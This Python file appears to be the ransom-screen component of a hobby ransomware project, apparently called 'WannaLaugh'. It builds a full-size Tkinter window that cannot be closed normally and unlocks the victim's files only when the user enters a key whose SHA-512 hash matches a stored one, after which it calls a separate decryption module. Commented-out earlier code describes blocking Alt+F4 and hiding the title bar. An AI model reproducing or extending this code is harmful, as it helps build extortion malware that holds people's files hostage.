
import sys, os

sys.path.append('../')
from conf import *


from styles import *
from tkinter import *
import os
import hashlib

class GUI():
	fgVal = "#D2BF55"

	def __onClose(self):
		pass

	def __checkKey(self):
		keyValue = hashlib.sha512(self.__keyAccept.get().encode())
		
		with open(".key.txt", 'r') as file:
			key = file.read()

		if keyValue.hexdigest() == key:
			sys.path.insert(1, os.path.join(ROOT_DIR, "Decryptor/"))

			from decrypt import Decrypt
			decryptData = Decrypt(self.__keyAccept.get())
			decryptData.decrypt()
			
			self.root.destroy()





	def createWindow(self):
		bgVal = "#000000"
		fgVal = "#D2BF55"

		try:
			self.root = Tk()
			self.root.configure(background=bgVal, height = 700, width = 820)
			self.root.resizable(FALSE, FALSE)    #resizing turned off
			self.root.protocol("WM_DELETE_WINDOW", self.__onClose)
			self.root.eval('tk::PlaceWindow %s center' % self.root.winfo_pathname(self.root.winfo_id()))

			Label(self.root, text=art, font='TkFixedFont', background=bgVal, foreground=fgVal).place(relx=.505, rely=.13, anchor="center")
			Label(self.root, text = borderScreen, font = 'TkFixedFont', background=bgVal, foreground= fgVal).place(relx=.5, rely=.5,anchor="center")
			Label(self.root, text=text, background=bgVal, foreground="#55DBCB", font = "TkFixedFont").place(relx=.5, rely=.45, anchor="center")
			self.__keyAccept = Entry(self.root, font = ('TkFixedFont', 10, 'bold'), foreground = "black", background = fgVal, borderwidth = 0, width = 50, justify = CENTER)
			self.__keyAccept.place(relx=.5, rely=.54, anchor="center")
			submitBtn = Button(self.root, text=" Enter ", font = ('TkFixedFont', 10, 'bold'), command=self.__checkKey, background=fgVal, foreground=bgVal, borderwidth = 0) 
			submitBtn.place(relx=.5, rely=.6, anchor="center")
		except Exception as e:
			print(e)

		self.root.mainloop()

	# def __init__(self):
	# 	self.createWindow()
	# 	pass

# g = GUI()
























#     #using from tkinter.ttk  import * , breaks the button-background on windows. So removed the Style part for now
# def gui():

#     fgVal = "#D2BF55"

#     root = Tk()
#     root.configure(background=bgVal, height = 700, width = 820)
#     root.resizable(FALSE, FALSE)    #resizing turned off

#     #Prevent using alt + F4 close



#     #If the entered key is right this popUP msg will be triggered.
#     #KEY CHECK HAS NOT BEEN IMPLEMENTED YET

#     def popupmsg(msg):
#         popup = Tk()
#         popup.configure(background=bgVal, height = 200, width = 200)
#         popup.resizable(FALSE, FALSE)
#         popup.eval('tk::PlaceWindow %s center' % popup.winfo_pathname(popup.winfo_id()))
#         label = Label(popup, text=msg, font= ('TkFixedFont', 10, 'bold'),background=bgVal, foreground= fgVal)
#         label.pack(side="top", fill="x", pady=10)
#         B1 = Button(popup, text="Okay", font = ('TkFixedFont', 10, 'bold'), command = popup.destroy, background=fgVal, foreground=bgVal)
#         B1.pack()
#         popup.mainloop()

#     #sets the window in center of the screen
#     root.eval('tk::PlaceWindow %s center' % root.winfo_pathname(root.winfo_id()))

#     #removes title bar and removes the ability to close the application from task bar
#     #root.overrideredirect(True)

#     #accepting key
#     def keyCatch():
#         #print(keyAccept.get())
#         popupmsg("Files will be extracted")

#     #storing user input in a text file : userGivenKey

#     def keyVal():
#         keyValue = keyAccept.get()
#         #print(keyValue)
#         userFile = open(".userGivenKey.txt", "w+")
#         userFile.write(keyValue)
#         userFile.close()

#         with open(".key.txt", 'r') as readKey:
#             if dscrmbl(readKey.readline()) == keyValue:
#                 decrypt()
#                 exit()
    
        
#     def esc():
#         root.destroy()
#     #Banner WannaLaugh
#     Label(root,text=art, font='TkFixedFont', background=bgVal, foreground=fgVal).place(relx=.505, rely=.13, anchor="center")

#     #Border design
#     Label(root, text = borderScreen, font = 'TkFixedFont', background=bgVal, foreground= fgVal).place(relx=.5, rely=.5,anchor="center")

#     #Enter the key TEXT
#     Label(root, text=text, background=bgVal, foreground="#55DBCB", font = "TkFixedFont").place(relx=.5, rely=.45, anchor="center")

#     #Music Logo
#     Label(root,text=musiclLogo, font='TkFixedFont', background=bgVal, foreground="#55DBCB").place(relx=.14, rely=.9, anchor="center")

#     #Accepting input : 
#     keyAccept = Entry(root, font = ('TkFixedFont', 10, 'bold'), foreground = "black", background = fgVal, borderwidth = 0, width = 50, justify = CENTER)
#     keyAccept.place(relx=.5, rely=.54, anchor="center")

#     #Button
#     submitBtn = Button(root, text=" Enter ", font = ('TkFixedFont', 10, 'bold'), command=keyVal, background=fgVal, foreground=bgVal, borderwidth = 0) 
#     submitBtn.place(relx=.5, rely=.6, anchor="center")

#     #Close button
#     escBtn = Button(root, text=" Close ", font = ('TkFixedFont', 10, 'bold'), command=esc, background=fgVal, foreground=bgVal, borderwidth = 0) 
#     escBtn.place(relx=.5, rely=.8, anchor="center")

#     #playing music
#     #winsound.PlaySound(".\\extras\\Goosebumps.wav", winsound.SND_ALIAS | winsound.SND_LOOP + winsound.SND_ASYNC)
#     root.mainloop()

        
# def main():
#     gui()

# if __name__ == "__main__":
#     main()



















